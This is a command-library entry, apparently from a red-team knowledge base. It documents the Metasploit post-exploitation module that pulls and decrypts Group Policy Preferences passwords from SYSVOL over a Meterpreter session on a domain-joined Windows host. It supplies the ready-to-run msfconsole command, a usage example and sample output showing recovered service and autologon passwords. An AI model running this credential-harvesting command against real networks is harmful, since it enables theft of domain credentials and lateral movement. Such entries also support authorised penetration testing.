---
id: 7b6aee8c-5417-4391-b34f-44c1ea83c388
name: Metasploit Enum GPP Credentials
type: command
executor: msfconsole
data: use post/windows/gather/credentials/gpp; set SESSION $_SESSION_ID; run
output: null
created_at: '2023-04-06T03:56:03.529949+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
tags:
  - credential-access
  - gpp
verified: true
validated: true
---

# Metasploit Enum GPP Credentials

## Command

```msfconsole
use post/windows/gather/credentials/gpp; set SESSION $_SESSION_ID; run
```

## Description

Extracts and decrypts Group Policy Preferences credentials from SYSVOL XML files via a Meterpreter session on a domain-joined Windows host.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| SESSION ($_SESSION_ID) | Meterpreter session ID | Yes |

## Examples

### Basic Usage

```msfconsole
use post/windows/gather/credentials/gpp; set SESSION 1; run
```

## Expected Output

[*] GPP Password found: 'Password123!' for user 'svc_account' in Groups.xml  
[*] Autologon Password: 'AdminPass' for machine 'DC01' in ScheduledTasks.xml

## Related

- [[procedures/Automated-Password-Extraction-from-SYSVOL-and-Group-Policy-Preferences]]
- [[tools/Metasploit-Framework]]
